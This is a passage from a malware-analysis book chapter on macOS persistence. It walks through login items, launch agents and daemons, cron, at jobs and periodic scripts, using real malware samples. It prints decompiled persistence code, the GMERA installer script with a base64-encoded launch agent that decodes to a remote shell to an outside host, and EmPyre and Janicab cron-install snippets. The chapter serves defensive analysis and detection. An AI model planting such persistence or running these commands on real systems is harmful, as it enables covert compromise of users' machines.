<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" lang="en" xml:lang="en">
<head>
<title>Chapter 2: Persistence</title>
<link href="NSTemplate_v1.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:a248aa67-aa2c-49b1-a34e-c916914c0e30" name="Adept.expected.resource"/>
</head>
<body epub:type="bodymatter chapter">
<section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" id="Page_23" title="23"/>2</span><br/>
<span class="ChapterTitle">Persistence</span></h1>
</header>
<figure class="opener">
<img alt="" src="image_fi/book_art/chapterart.png"/>
</figure>
<p class="ChapterIntro">Once malware has successfully gained access to a system, its next goal is usually to persist. <em>Persistence</em> is the means by which malware installs itself on a system to ensure it will automatically re-execute upon startup, user login, or some other deterministic event. The vast majority of Mac malware attempts to gain persistence; otherwise, a system reboot may act as its death knell. </p>
<p>Of course, not all malware persists. One notable kind of malware that generally doesn’t persist is <em>ransomware</em>, a type of malicious code that encrypts user files and then demands a ransom in order to restore the files. Once the malware has encrypted the user’s files and provided ransom instructions, there’s no need for it to hang around. Similarly, sophisticated attackers may leverage memory-only payloads that, by design, won’t survive a system reboot. The appeal? An incredibly high level of stealth.</p>
<p>Still, the majority of malware persists in some manner. Modern operating systems, including macOS, provide various ways for legitimate software <span epub:type="pagebreak" id="Page_24" title="24"/>to persist. Security tools, updaters, and other programs often make use of such mechanisms to ensure they restart automatically each time the system is rebooted. Throughout the years, malware authors have leveraged these same mechanisms to continuously execute their malicious creations. In this chapter, we’ll discuss the persistence mechanisms that Mac malware frequently abuses (or in a few cases, could abuse). Where applicable, we’ll highlight actual malicious specimens that leverage each persistence technique. Armed with a comprehensive understanding of these methods, you should be able to more effectively analyze Mac malware, as well as uncover persistent malware on an infected system. </p>
<h2 id="h1--0001">Login Items</h2>
<p class="BodyFirst">If an application should be automatically executed each time the user logs in, Apple recommends installing it as a <em>login item</em>. Login items run within the user’s desktop session, inheriting the user’s permissions, and start automatically at user login. Due to this afforded persistence, Mac malware will commonly install itself as a login item. You can find examples of this technique in malware like Kitm, NetWire, and WindTail.</p>
<p>You can view login items in the System Preferences application. Select the <b>Login Items</b> tab of the <b>Users &amp; Groups</b> pane (<a href="#figure2-1" id="figureanchor2-1">Figure 2-1</a>).</p>
<figure>
<img alt="&lt;&lt; The Users &amp; Groups pane of Mac’s System Preferences application, in which Login Items is selected and shows items that open automatically when the user logs in. The Finder application is the only login item listed here.&gt;&gt;" class="" src="image_fi/501942c02/f02001.png"/>
<figcaption><p><a id="figure2-1">Figure 2-1</a>: Persistent login items. The Finder item is actually malware (NetWire).</p></figcaption>
</figure>
<p>Unfortunately, as macOS doesn’t readily show the full path to a persisted login item in its interface (unless you hover over the item for a few <span epub:type="pagebreak" id="Page_25" title="25"/>seconds), malware will often successfully masquerade as legitimate software. For example, in <a href="#figure2-1">Figure 2-1</a>, the Finder item is actually malware, known as NetWire, persisting as a login item. </p>
<p>Apple’s <code>backgroundtaskmanagementagent</code> program, which manages various background tasks such as login items, stores these items in a file named <em>backgrounditems.btm</em>. For more technical details on this file and its format, see my blog post “Block Blocking Login Items.”<sup class="endnote"><a href="#-endnote-1" id="-noteref-1">1</a></sup></p>
<p>To programmatically create a login item, software can invoke various shared file list (<code>LSSharedFileList*</code>) APIs. For example, the <code>LSSharedFileListCreate</code> function returns a reference to the list of existing login items. This list can then be passed to the <code>LSSharedFileListInsertItemURL</code> function, along with the path of a new application you want to persist as a login item. To illustrate this concept, take a look at the following decompiled code from the NetWire malware. The malware has copied itself to <em>~/.defaults/Finder.app</em> and now is persisting as a login item,<em> </em>ensuring that each time the user logs in, macOS will automatically execute it (<a href="#listing2-1" id="listinganchor2-1">Listing 2-1</a>).</p>
<pre><code>length = snprintf_chk(&amp;path, 0x400, ...., "%s%s.app", &amp;directory, &amp;name);<br/>pathAsURL = CFURLCreateFromFileSystemRepresentation(0x0, &amp;path, length, 0x1); <span aria-label="annotation1" class="CodeAnnotationCode">1</span><br/>...<br/>list = LSSharedFileListCreate(0x0, kLSSharedFileListSessionLoginItems, 0x0);<br/>LSSharedFileListInsertItemURL(list, kLSSharedFileListItemLast, 0x0, 0x0, pathAsURL, ... ); <span aria-label="annotation2" class="CodeAnnotationCode">2</span></code></pre>
<p class="CodeListingCaption"><a id="listing2-1">Listing 2-1</a>: Login item persistence (NetWire)</p>
<p>In this code snippet, the malware first constructs the full path to its location on disk <span aria-label="annotation1" class="CodeAnnotation">1</span>. It then invokes various <code>LSSharedFileList*</code> APIs to install itself as a login item <span aria-label="annotation2" class="CodeAnnotation">2</span>. Persistence achieved! </p>
<p>WindTail is another malware specimen that persists as a login item. By means of macOS’s <code>nm</code> utility, you can view the imported APIs a binary invokes, including, in this case, those related to persistence (<a href="#listing2-2" id="listinganchor2-2">Listing 2-2</a>).</p>
<pre><code><b>% </b><b>nm WindTail/Final_Presentation.app/Contents/MacOS/usrnode</b><b> </b><br/>  ...<br/>  U _LSSharedFileListCreate<br/>  U _LSSharedFileListInsertItemURL<br/>  U _NSApplicationMain<br/>  ...<br/>  U _NSHomeDirectory<br/>  U _NSUserName</code></pre>
<p class="CodeListingCaption"><a id="listing2-2">Listing 2-2</a>: Imports, including <code>LSSharedFileList*</code> APIs (WindTail)</p>
<p>In the output from the <code>nm</code> utility, note that WindTail contains references to both the <code>LSSharedFileListCreate</code> and <code>LSSharedFileListInsertItemURL</code> APIs, which it invokes in order to ensure it will be automatically started each time the user logs in.</p>
<p>Recent versions of macOS also support application-specific helper login items. Found within the <em>LoginItems</em> subdirectory of an application’s bundle, these helpers can ensure that they will be automatically re-executed whenever the user logs in, by invoking the <code>SMLoginItemSetEnabled</code> API. Unfortunately, <span epub:type="pagebreak" id="Page_26" title="26"/>these helper login items do not show up in the aforementioned System Preferences pane, making them even harder to detect. For more information on these helper login items, see the “Modern Login Items” blog post or Apple’s documentation on the topic.<sup class="endnote"><a href="#-endnote-2" id="-noteref-2">2</a></sup></p>
<h2 id="h1--0002">Launch Agents and Daemons</h2>
<p class="BodyFirst">While Apple offers login items as a way to persist applications, it also has a mechanism called <em>launch items</em> for persisting non-application binaries, such as software updaters and background processes. As the majority of Mac malware seeks to run surreptitiously in the background, it’s no surprise that most Mac malware leverages launch items in order to persist. In fact, according to my “Mac Malware of 2019” report, every piece of analyzed malware in that year that chose to persist did so as a launch item.<sup class="endnote"><a href="#-endnote-3" id="-noteref-3">3</a></sup> These specimens include NetWire, Siggen, GMERA, and many more.</p>
<p>There are two kinds of launch items: launch agents and launch daemons. <em>Launch daemons</em> are non-interactive and are often launched before user login. In addition, they run with root permissions. An example of such a daemon is Apple’s software updater, <code>softwareupdated</code>. On the other hand, <em>launch agents</em> run once the user has logged in with standard user permissions, and they may interact with the user session. Apple’s <code>NotificationCenter</code> program, which handles displaying notifications to the user, runs as a persistent launch agent. </p>
<p>You’ll find third-party launch daemons stored in macOS’s <em>/Library/LaunchDaemons</em> directory, and third-party launch agents are stored in either the <em>/Library/LaunchAgents </em>or <em>~/Library/LaunchAgents</em> directory. To persist as a launch item, a launch item property list should be created in one of these directories. A property list, or <em>plist</em>, is an XML, JSON, or binary file that contains key/value pairs that may store data such as configuration information, settings, serialized objects, and more. These files are ubiquitous in macOS. In fact, we already explored applications’ <em>Info.plist</em> files in <span class="xref" itemid="xref_target_Chapter 1">Chapter 1</span>. To view the contents of a property list file, regardless of its format, use either of the following utilities (<a href="#listing2-3" id="listinganchor2-3">Listing 2-3</a>).</p>
<pre><code>plutil -p <em>&lt;path to plist</em><em>&gt;</em><br/>defaults read <em>&lt;path to plist&gt;</em></code></pre>
<p class="CodeListingCaption"><a id="listing2-3">Listing 2-3</a>: macOS utilities for parsing <em>.plist</em> files</p>
<p>A launch item’s property list file describes the launch item to <code>launchd</code>, the system daemon responsible for processing such plists. In terms of persistence, the most pertinent key/value pairs include:</p>
<ul>
<li><code>Label</code>: A name that identifies the launch item. It’s usually written in reverse domain name notation, <code>com.</code><var>companyName</var><code>.</code><var>itemName</var>.</li>
<li><code>Program</code> or <code>ProgramArguments</code>: Contains the path to the launch item’s executable script or binary. Arguments to be passed to this executable item are optional, but they can be specified if using the <code>ProgramArguments</code> key. </li>
<li><span epub:type="pagebreak" id="Page_27" title="27"/><code>RunAtLoad</code>: Contains a Boolean that, if set to <code>true</code>, instructs <code>launchd</code> to automatically start the launch item. If the item is a launch daemon, it will be started during system initialization. On the other hand, as launch agents are user-specific, they will be started later, once the user has initiated the login process.</li>
</ul>
<p>These three key/value pairs are enough to create a persistent launch item. To demonstrate this, let’s create a launch item named <code>com.foo.bar</code> (<a href="#listing2-4" id="listinganchor2-4">Listing 2-4</a>).</p>
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;!DOCTYPE plist PUBLIC ...&gt;<br/>&lt;plist version="1.0"&gt;&lt;dict&gt;<br/> &lt;key&gt;Label&lt;/key&gt;    <br/> &lt;string&gt;com.foo.bar&lt;/string&gt;   <br/> &lt;key&gt;ProgramArguments&lt;/key&gt;<br/>     &lt;array&gt;        <br/>    &lt;string&gt;/Users/user/launchItem&lt;/string&gt;       <br/>    &lt;string&gt;foo&lt;/string&gt;    <br/>    &lt;string&gt;bar&lt;/string&gt;    <br/> &lt;/array&gt;    <br/> &lt;key&gt;RunAtLoad&lt;/key&gt;    <br/><span aria-label="annotation1" class="CodeAnnotationCode">1</span> &lt;true/&gt; <br/>&lt;/dict&gt;<br/>&lt;/plist&gt;</code></pre>
<p class="CodeListingCaption"><a id="listing2-4">Listing 2-4</a>: An example launch item property list</p>
<p>By means of the <code>ProgramArguments</code> array, this launch item instructs <code>launchd</code> to execute the file <em>/Users/user/launchItem</em> with two command line arguments: <code>foo</code> and <code>bar</code>. As the <code>RunAtLoad</code> key is set to <code>true</code> <span aria-label="annotation1" class="CodeAnnotation">1</span>, this file will be automatically executed, even before a user logs in. For a comprehensive discussion of all things related to launch items, including plists and their key/value pairs, see “A Launchd Tutorial” or “Getting Started with Launchd.”<sup class="endnote"><a href="#-endnote-4" id="-noteref-4">4</a></sup> These resources include discussions of other key/value pairs (beyond <code>RunAtLoad</code>) that may be used by persistent malware, such as <code>PathState</code> and <code>StartCalendarInterval</code>. As malware persisting as launch items is rather ubiquitous, let’s now look at a few examples.</p>
<p>Earlier in this chapter, we showed how NetWire persists as a login item. Interestingly, it also persists as a launch agent. If victims find and remove one persistence mechanism, they may assume it’s the only such mechanism and overlook the other. Thus, the malware will continue to automatically restart each time the user logs in. Examining the malware’s binary reveals an embedded property list template at address <code>0x0000db60</code> (<a href="#listing2-5" id="listinganchor2-5">Listing 2-5</a>).</p>
<pre><code>0x0000db60 "&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n<br/>&lt;!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\n\t\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;\n<br/><span epub:type="pagebreak" id="Page_28" title="28"/>&lt;plist version=\"1.0\"&gt;\n<br/>&lt;dict&gt;\n<br/>    &lt;key&gt;Label&lt;/key&gt;\n<br/>    &lt;string&gt;%s&lt;/string&gt;\n<br/>    &lt;key&gt;ProgramArguments&lt;/key&gt;\n<br/>    &lt;array&gt;\n<br/>        &lt;string&gt;%s&lt;/string&gt;\n<br/>    &lt;/array&gt;\n<br/>    &lt;key&gt;RunAtLoad&lt;/key&gt;\n<br/>  <span aria-label="annotation1" class="CodeAnnotationCode">1</span> &lt;true/&gt;\n<br/>    &lt;key&gt;KeepAlive&lt;/key&gt;\n<br/>    &lt;%s/&gt;\n<br/>&lt;/dict&gt;\n<br/>&lt;/plist&gt;\n", 0</code></pre>
<p class="CodeListingCaption"><a id="listing2-5">Listing 2-5</a>: A launch item property list template (NetWire)</p>
<p>At install time, the malware will dynamically populate this plist template by, for example, replacing the <code>%s</code> in the <code>ProgramArguments</code> array with a path to the malware’s binary on the infected system. As the <code>RunAtLoad</code> key is set to <code>true</code> <span aria-label="annotation1" class="CodeAnnotation">1</span>, macOS will start this binary any time the system reboots and the user logs in.</p>
<p>The following snippet of decompiled code from NetWire shows that, once it has configured the launch agent property list, this property list is written out to the user’s launch agent directory, <em>~/Library/LaunchAgents</em> (<a href="#listing2-6" id="listinganchor2-6">Listing 2-6</a>).</p>
<pre><code>... <br/>eax = getenv("HOME");<br/>eax = snprintf_chk(&amp;var_6014, 0x400, 0x0, 0x400, "%s/Library/LaunchAgents/", eax); <span aria-label="annotation1" class="CodeAnnotationCode">1</span><br/>...<br/>eax = snprintf_chk(edi, 0x400, 0x0, 0x400, "%s%s.plist", &amp;var_6014, 0xe5d6); <span aria-label="annotation2" class="CodeAnnotationCode">2</span><br/><br/>edi = open(edi, 0x601);<br/>if (edi &gt;= 0x0) {<br/>  write(edi, var_688C, ebx); <span aria-label="annotation3" class="CodeAnnotationCode">3</span><br/>  ...<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing2-6">Listing 2-6</a>: Launch agent persistence logic (NetWire)</p>
<p>In the decompiled code, you can see the malware first invoking the <code>getenv</code> API to get the value of the <code>HOME</code> environment variable, which is set to the current user’s home directory. This value is then passed to the <code>snprintf_chk</code> API to dynamically build the path to the user’s <em>LaunchAgents</em> directory <span aria-label="annotation1" class="CodeAnnotation">1</span>. The malware then invokes <code>snprintf_chk</code> again to append the name of the property list file <span aria-label="annotation2" class="CodeAnnotation">2</span>. As this name gets decrypted by the malware at runtime, it doesn’t show up as a plaintext string in <a href="#listing2-6">Listing 2-6</a>. </p>
<p>Once the malware has constructed a full path, it writes out the dynamically configured plist <span aria-label="annotation3" class="CodeAnnotation">3</span>. After the code has executed, you can inspect the <em>.plist</em> file <em>(~/Library/LaunchAgents/com.mac.host.plist</em>) via a tool such as macOS’s <code>defaults</code> (<a href="#listing2-7" id="listinganchor2-7">Listing 2-7</a>).</p>
<pre><code><span epub:type="pagebreak" id="Page_29" title="29"/>% <b>defaults read ~/Library/LaunchAgents/com.mac.host.plist</b><br/>{<br/>    KeepAlive = 0;<br/>    Label = "com.mac.host";<br/>    ProgramArguments =     (<br/>        "/Users/user/.defaults/Finder.app/Contents/MacOS/Finder"<br/>    );<br/>    RunAtLoad = 1;<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing2-7">Listing 2-7</a>: A malicious launch item property list (NetWire)</p>
<p>Notice from the output that the path to the persistent component of the malware can be found in the <code>ProgramArguments</code> array: <em>/Users/user/.defaults/Finder.app/Contents/MacOS/Finder</em>. As noted, the malware programmatically determines the current user’s home directory at runtime, because this directory name is likely unique to each infected system. </p>
<p>In order to hide to some extent, NetWire installs its persistent binary, <em>Finder</em>, into a directory it creates, named <em>.defaults</em>. Normally, macOS won’t display directories that begin with a period. Thus, the malware may remain hidden from the majority of unsuspecting users. (You can instruct Finder to show such hidden files by pressing <span class="KeyCaps">command-shift-space</span> [<span class="NSSymbol">⌘</span>-<span class="NSSymbol">⇧</span>-<span class="KeyCaps">space</span>] or using the <code>ls</code> command with the <code>-a</code> option in the Terminal.) You can also see that in the <em>.plist</em> file the <code>RunAtLoad</code> key is set to <code>1</code> (true), which instructs the system to automatically start the malware’s binary each time the user logs in. Persistence achieved! </p>
<p>Another example of a Mac malware specimen that persists as a launch item is GMERA. Distributed as a trojanized cryptocurrency trading application, it contains an installer script named <em>run.sh</em> in the <em>Resources/</em> directory of its application bundle (<a href="#figure2-2" id="figureanchor2-2">Figure 2-2</a>).</p>
<figure>
<img alt="&lt;&lt;Stockfoli.app contents in finder, which includes a Resources folder. This folder contains documents, the application, and a shell script named run.sh.&gt;&gt;" class="" src="image_fi/501942c02/f02002.png"/>
<figcaption><p><a id="figure2-2">Figure 2-2</a>: A trojanized application (GMERA)</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_30" title="30"/>Examining this script reveals commands that will install a persistent and hidden launch agent to <em>~/Library/LaunchAgents/.com.apple.upd.plist</em> (<a href="#listing2-8" id="listinganchor2-8">Listing 2-8</a>). </p>
<pre><code>#! /bin/bash<br/>...<br/>plist_text="PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHBsaXN0IFBVQkxJQyAiLS8vQXBwbGUvL0RURCBQTElTVCAxLjAvL0VOIiAiaHR0cDovL3d3dy5hcHBsZS5jb20vRFREcy9Qcm9wZXJ0eUxpc3QtMS4wLmR0ZCI+CjxwbGlzdCB2ZXJzaW9uPSIxLjAiPgo8ZGljdD4KCTxrZXk+S2VlcEFsaXZlPC9rZXk+Cgk8dHJ1ZS8+Cgk8a2V5PkxhYmVsPC9rZXk+Cgk8c3RyaW5nPmNvbS5hcHBsZXMuYXBwcy51cGQ8L3N0cmluZz4KCTxrZXk+UHJvZ3JhbUFyZ3VtZW50czwva2V5PgoJPGFycmF5PgoJCTxzdHJpbmc+c2g8L3N0cmluZz4KCQk8c3RyaW5nPi1jPC9zdHJpbmc+CgkJPHN0cmluZz5lY2hvICdkMmhwYkdVZ09qc2daRzhnYzJ4bFpYQWdNVEF3TURBN0lITmpjbVZsYmlBdFdDQnhkV2wwT3lCc2MyOW1JQzEwYVNBNk1qVTNNek1nZkNCNFlYSm5jeUJyYVd4c0lDMDVPeUJ6WTNKbFpXNGdMV1FnTFcwZ1ltRnphQ0F0WXlBblltRnphQ0F0YVNBK0wyUmxkaTkwWTNBdk1Ua3pMak0zTGpJeE1pNHhOell2TWpVM016TWdNRDRtTVNjN0lHUnZibVU9JyB8IGJhc2U2NCAtLWRlY29kZSB8IGJhc2g8L3N0cmluZz4KCTwvYXJyYXk+Cgk8a2V5PlJ1bkF0TG9hZDwva2V5PgoJPHRydWUvPgo8L2RpY3Q+CjwvcGxpc3Q+"<br/><br/>echo "$plist_text" |   base64 --decode<span aria-label="annotation1" class="CodeAnnotation">1</span> &gt; "/tmp/.com.apple.upd.plist"<br/>  cp "/tmp/.com.apple.upd.plist" "$HOME/Library/LaunchAgents/.com.apple.upd.plist" <span aria-label="annotation2" class="CodeAnnotation">2</span><br/>  launchctl load "/tmp/.com.apple.upd.plist" <span aria-label="annotation3" class="CodeAnnotation">3</span></code></pre>
<p class="CodeListingCaption"><a id="listing2-8">Listing 2-8</a>: A malicious installer script, <em>run.sh</em> (GMERA)</p>
<p>Notice that the obfuscated contents of the plist are found in a variable named <code>plist_text</code>. The malware decodes the plist using the macOS <code>base64</code> command <span aria-label="annotation1" class="CodeAnnotation">1</span> and writes it out to the <em>/tmp</em> directory as <em>.com.apple.upd.plist</em>. Then, via the <code>cp</code> command, it copies it to the user’s <em>LaunchAgents</em> directory <span aria-label="annotation2" class="CodeAnnotation">2</span>. Finally, it starts the launch agent via the <code>launchctl</code> command <span aria-label="annotation3" class="CodeAnnotation">3</span>.</p>
<p>Once the installer script has been executed, you can examine the now-decoded launch agent property list, <em>.com.apple.upd.plist</em> (<a href="#listing2-9" id="listinganchor2-9">Listing 2-9</a>).</p>
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" ...&gt;<br/>&lt;plist version="1.0"&gt;<br/>&lt;dict&gt;<br/>  &lt;key&gt;KeepAlive&lt;/key&gt;<br/>  &lt;true/&gt;<br/>  &lt;key&gt;Label&lt;/key&gt;<br/>  &lt;string&gt;com.apples.apps.upd&lt;/string&gt;<br/>  &lt;key&gt;ProgramArguments&lt;/key&gt;<br/> &lt;array&gt;<br/>   &lt;string&gt;sh&lt;/string&gt;<br/>   &lt;string&gt;-c&lt;/string&gt; <br/>   &lt;string&gt;echo 'd2hpbGUgOjs...RvbmU=' | base64 --decode | bash&lt;/string&gt;<br/> &lt;/array&gt;<br/> <span aria-label="annotation1" class="CodeAnnotationHang">1</span> &lt;key&gt;RunAtLoad&lt;/key&gt; <br/> &lt;true/&gt;<br/>&lt;/dict&gt;</code></pre>
<p class="CodeListingCaption"><a id="listing2-9">Listing 2-9</a>: A malicious launch agent plist (GMERA)</p>
<p>As the <code>RunAtLoad</code> key is set to <code>true</code> <span aria-label="annotation1" class="CodeAnnotation">1</span>, the commands specified in the <code>ProgramArguments</code> array, which decode to a remote shell, will be automatically executed each time the user logs in. </p>
<p><span epub:type="pagebreak" id="Page_31" title="31"/>For a final example of launch item persistence, let’s take a look at EvilQuest. This malware will persist as a launch daemon if it is running with root privileges, but because launch daemons run as root, the user has to possess root privileges in order to create one. Thus, if EvilQuest finds itself only running with user privileges, it instead creates a user launch agent.</p>
<p>To handle this persistence, EvilQuest contains an embedded property list template that’s used to create launch items. However, in an attempt to complicate analysis, this template is encrypted. In subsequent chapters, I’ll describe how to defeat anti-analysis attempts like these, but for now you just need to know that we can leverage a debugger and simply wait until the malware has decrypted the embedded property list template itself. Then we can view the unencrypted plist template in memory (<a href="#listing2-10" id="listinganchor2-10">Listing 2-10</a>).</p>
<pre><code>% <b>lldb /Library/mixednkey/toolroomd</b><br/>...<br/>(lldb) <b>x/s $rax</b><br/>0x100119540: "&lt;?xml version="1.0" encoding="UTF-8"?&gt;\n&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;\n&lt;plist version="1.0"&gt;\n&lt;dict&gt;\n&lt;key&gt;Label&lt;/key&gt;\n&lt;string&gt;%s&lt;/string&gt;\n\n&lt;key&gt;ProgramArguments&lt;/key&gt;\n&lt;array&gt;\n&lt;string&gt;%s&lt;/string&gt;\n&lt;string&gt;--silent&lt;/string&gt;\n&lt;/array&gt;\n\n&lt;key&gt;RunAtLoad&lt;/key&gt;\n&lt;true/&gt;\n\n&lt;key&gt;KeepAlive&lt;/key&gt;\n&lt;true/&gt;\n\n&lt;/dict&gt;\n&lt;/plist&gt;"</code></pre>
<p class="CodeListingCaption"><a id="listing2-10">Listing 2-10</a>: A decrypted property list template (EvilQuest)</p>
<p>Here we’re using <code>lldb</code>, the macOS debugger, to launch the file named <em>toolroomd</em>. Sometime later, the malware decrypts the plist template and stores its memory address in the <code>RAX</code> register. This allows us to display the now-decrypted template via the <code>x/s</code> command. </p>
<p>Oftentimes, a simpler approach is to execute the malware in a standalone analysis or virtual machine and wait until the malware writes out its launch item property list. Once EvilQuest has completed its installation and persistently infected the system, you can find its launch daemon property list, named <em>com.apple.questd.plist</em>, in the <em>/Library/LaunchDaemons</em> directory (<a href="#listing2-11" id="listinganchor2-11">Listing 2-11</a>).</p>
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;<br/>&lt;plist version="1.0"&gt;<br/>&lt;dict&gt;<br/>    &lt;key&gt;Label&lt;/key&gt;<br/>    &lt;string&gt;questd&lt;/string&gt;<br/>    &lt;key&gt; <span aria-label="annotation1" class="CodeAnnotationCode">1</span> ProgramArguments&lt;/key&gt; <br/>    &lt;array&gt;<br/>        &lt;string&gt;sudo&lt;/string&gt;<br/>        &lt;string&gt;/Library/AppQuest/com.apple.questd&lt;/string&gt;<br/>        &lt;string&gt;--silent&lt;/string&gt;<br/>    &lt;/array&gt;<br/>    &lt;key&gt; <span aria-label="annotation2" class="CodeAnnotationCode">2</span> RunAtLoad&lt;/key&gt; <br/><span epub:type="pagebreak" id="Page_32" title="32"/>    &lt;true/&gt;<br/>    ...<br/>&lt;/dict&gt;</code></pre>
<p class="CodeListingCaption"><a id="listing2-11">Listing 2-11</a>: A launch item plist (EvilQuest)</p>
<p>As the <code>RunAtLoad</code> key is set to <code>true</code> <span aria-label="annotation2" class="CodeAnnotation">2</span>, the values held in the <code>ProgramArguments</code> array <span aria-label="annotation1" class="CodeAnnotation">1</span> will be automatically executed each time the system is rebooted.</p>
<h2 id="h1--0003">Scheduled Jobs and Tasks</h2>
<p class="BodyFirst">On macOS there are various ways to schedule jobs or tasks to run at specified intervals. Malware can (and does) abuse these mechanisms as a means to maintain persistence on infected macOS systems. This section looks at several of these scheduling mechanisms, such as cron jobs, at jobs, and periodic scripts. Note that launch items, too, can be scheduled to run at regular intervals via the <code>StartCalendarInterval</code> key, but as we discussed them earlier in this chapter, we won’t cover them again here. </p>
<h3 id="h2--0001">Cron Jobs</h3>
<p class="BodyFirst">Due to its core foundations in BSD, macOS affords several Unix-like persistence mechanisms. <em>Cron jobs</em> are one such example. Often leveraged by sysadmins, they provide a way to persistently execute scripts, commands, and binaries at certain times. Unlike the login and launch items discussed earlier, persistent cron jobs generally execute automatically at specified intervals, such as hourly, daily, or weekly, rather than at specified events like user login. You can schedule a persistent cron job via the built-in <em>/usr/bin/crontab</em> utility. </p>
<p>Abusing cron jobs for persistence isn’t particularly common in macOS malware. However, the popular open source post-exploitation agent EmPyre, which is sometimes used by attackers targeting macOS users, provides an example.<sup class="endnote"><a href="#-endnote-5" id="-noteref-5">5</a></sup> In its crontab persistence module, EmPyre directly invokes the <em>crontab</em> binary to install itself as a cron job (<a href="#listing2-12" id="listinganchor2-12">Listing 2-12</a>).</p>
<pre><code>cmd = <span aria-label="annotation1" class="CodeAnnotationCode">1</span> 'crontab -l | { cat; echo "0 * * * * %s"; } | <span aria-label="annotation2" class="CodeAnnotationCode">2</span> crontab -'<br/><span aria-label="annotation3" class="CodeAnnotationHang">3</span> subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()</code></pre>
<p class="CodeListingCaption"><a id="listing2-12">Listing 2-12</a>: Cron job persistence (EmPyre)</p>
<p>EmPyre first builds a string by concatenating several subcommands that together add a new malicious cron job with any current ones. The <code>crontab</code> command (with the <code>-l</code> flag) will list the user’s existing cron jobs <span aria-label="annotation1" class="CodeAnnotation">1</span>. The <code>cat</code> and <code>echo</code> commands append the new command. Finally, the <code>crontab</code> command (with the <code>-</code> flag) will reinstall any existing jobs, along with the new cron job <span aria-label="annotation2" class="CodeAnnotation">2</span>. Once these commands have been concatenated together (and stored into the <code>cmd</code> variable), they will then be executed via the Popen API of the Python subprocess module <span aria-label="annotation3" class="CodeAnnotation">3</span>. The <code>%s</code> in the <code>cmd</code> variable will be updated at runtime with the path of the item to persist, and the <code>0 * * * *</code> component instructs macOS to execute the job each and every hour. For a <span epub:type="pagebreak" id="Page_33" title="33"/>comprehensive discussion of cron jobs, including the syntax of job creation, take a look at Wikipedia’s page titled “Cron.”<sup class="endnote"><a href="#-endnote-6" id="-noteref-6">6</a></sup></p>
<p>Let’s briefly look at another example of cron job persistence, courtesy of Janicab. This malware persists a compiled Python script, <em>runner.pyc</em>, as a cron job (<a href="#listing2-13" id="listinganchor2-13">Listing 2-13</a>).</p>
<pre><code>subprocess.call("crontab -l &gt; <span aria-label="annotation1" class="CodeAnnotationCode">1</span> /tmp/dump",shell=True) <br/>...<br/>subprocess.call( <span aria-label="annotation2" class="CodeAnnotationCode">2</span> "echo \"* * * * * python ~/.t/runner.pyc \" &gt;&gt;/tmp/dump",shell=True) <br/><br/>subprocess.call( <span aria-label="annotation3" class="CodeAnnotationCode">3</span> "crontab /tmp/dump",shell=True) <br/>subprocess.call("rm -f /tmp/dump",shell=True)</code></pre>
<p class="CodeListingCaption"><a id="listing2-13">Listing 2-13</a>: Cron job persistence (Janicab)</p>
<p>Janicab’s Python installer first saves any existing cron jobs into a temporary file named <em>/tmp/dump </em><span aria-label="annotation1" class="CodeAnnotation">1</span>. It then appends its new job to this file <span aria-label="annotation2" class="CodeAnnotation">2</span>, before invoking <code>crontab</code> to complete the cron job installation <span aria-label="annotation3" class="CodeAnnotation">3</span>. Once the new cron job has been added, macOS will execute the specified command, <code>python ~/.t/runner.pyc</code>, every minute. This compiled Python script ensures that the malware is always running, restarting it if necessary. </p>
<h3 id="h2--0002">At Jobs</h3>
<p class="BodyFirst">Another way to achieve persistence on macOS is via <em>at jobs</em>, which are scheduled one-time tasks.<sup class="endnote"><a href="#-endnote-7" id="-noteref-7">7</a></sup> You can find at jobs stored in the <em>/private/var/at/jobs/</em> directory and enumerate them via the <em>/usr/bin/atq</em> utility. On a default install of macOS, the at scheduler, <em>/usr/libexec/atrun,</em> is disabled. However, malware can enable it with root privileges (<a href="#listing2-14" id="listinganchor2-14">Listing 2-14</a>). </p>
<pre><code># <b>launchctl load -w /System/Library/LaunchDaemons/com.apple.atrun.plist</b></code></pre>
<p class="CodeListingCaption"><a id="listing2-14">Listing 2-14</a>: Enabling the at scheduler</p>
<p>After enabling this scheduler, malware can create an at job by simply piping persistent commands into <em>/usr/bin/at</em>, specifying the time and date of execution. Once executed, it can simply reschedule the job to maintain persistence. Currently, though, no Mac malware leverages this method for persistence. </p>
<h3 id="h2--0003">Periodic Scripts</h3>
<p class="BodyFirst">If you list the contents of <em>/etc/periodic</em>, you’ll find a directory containing scripts that will run on well-defined intervals (<a href="#listing2-15" id="listinganchor2-15">Listing 2-15</a>).</p>
<pre><code>% <b>ls /etc/periodic</b><br/><br/>daily<br/>weekly<br/>monthly</code></pre>
<p class="CodeListingCaption"><a id="listing2-15">Listing 2-15</a>: Periodic scripts</p>
<p><span epub:type="pagebreak" id="Page_34" title="34"/>Though this directory is owned by root, malware with adequate privileges may be able to create (or subvert) a periodic script in order to achieve persistence at regular intervals. Although periodic scripts are conceptually rather similar to cron jobs, there are a few differences, such as the fact that they are handled by a separate daemon.<sup class="endnote"><a href="#-endnote-8" id="-noteref-8">8</a></sup> Similar to at jobs, no malware currently leverages this method for persistence.</p>
<h2 id="h1--0004">Login and Logout Hooks</h2>
